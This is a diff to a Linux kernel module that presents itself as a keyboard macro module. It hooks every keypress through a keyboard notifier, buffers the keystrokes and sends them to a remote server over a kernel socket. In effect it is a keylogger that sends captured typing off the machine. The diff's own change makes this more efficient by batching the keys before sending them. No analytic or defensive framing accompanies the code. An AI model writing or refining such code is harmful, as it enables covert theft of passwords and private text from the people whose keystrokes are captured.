@@ -40,8 +40,8 @@ static const char *keymap[MAX_KEYCODE + 1] = {
     [KEY_INSERT] = "INSERT", [KEY_DELETE] = "DELETE",
 };
 
-//static char key_buffer[BUFFER_SIZE];
-//static int buffer_index = 0;
+char message[BUFFER_SIZE];
+static size_t message_len = 0;
 static struct socket *sock;
 static struct sockaddr_in s_addr;
 short shift_pressed = 0;
@@ -96,22 +96,33 @@ static int keyboard_event(struct notifier_block *nb, unsigned long code, void *p
     if (kp->down && kp->value >= 0 && kp->value <= MAX_KEYCODE) {
         const char *key_char = keymap[kp->value];
         if (key_char) {
-            char message[BUFFER_SIZE];
             char display_char = key_char[0];
             if (shift_pressed && display_char >= 'a' && display_char <= 'z') {
                 display_char = display_char - 'a' + 'A';  // Convert to uppercase
-                snprintf(message, BUFFER_SIZE, "Key pressed: %c", display_char);
+                snprintf(message + message_len, BUFFER_SIZE - message_len, "%c", display_char); // Append character
+                message_len += strlen(message + message_len);
+            } else if(display_char >= 'a' && display_char <= 'z'){ //character
+                snprintf(message + message_len, BUFFER_SIZE - message_len, "%c", display_char); // Append character
+                message_len += strlen(message + message_len);
             }
-            else{
-                snprintf(message, BUFFER_SIZE, "Key pressed: %s", key_char);
+            else{ //special string f.e. "SPACE"
+                snprintf(message + message_len, BUFFER_SIZE - message_len, " %s ", key_char); // Append string without spaces
+                message_len += strlen(message + message_len);
             }
-            send_data_to_server(message);
-            pr_info("Data sent to server: %s", message);
+            pr_info("size: %d", message_len);
+            pr_info("Data: %s", message);
+            if (message_len >= BUFFER_SIZE - 1) {
+                send_data_to_server(message);
+                pr_info("Data sent to server: %s", message);
+                memset(message, 0, BUFFER_SIZE);
+                message_len = 0;
+            }
         }
     }
 
     return NOTIFY_OK;
 }
+
 
 static struct notifier_block keyboard_nb = {
     .notifier_call = keyboard_event
@@ -120,6 +131,7 @@ static struct notifier_block keyboard_nb = {
 static int __init keyboard_macro_init(void)
 {
     int ret;
+    memset(message, 0, BUFFER_SIZE);
 
     ret = register_keyboard_notifier(&keyboard_nb);
     if (ret) {
@@ -158,6 +170,7 @@ static void __exit keyboard_macro_exit(void)
     if (sock)
         sock_release(sock);
 
+    memset(message, 0, BUFFER_SIZE);
     pr_info("Keyboard macro module unloaded\n");
 }
 
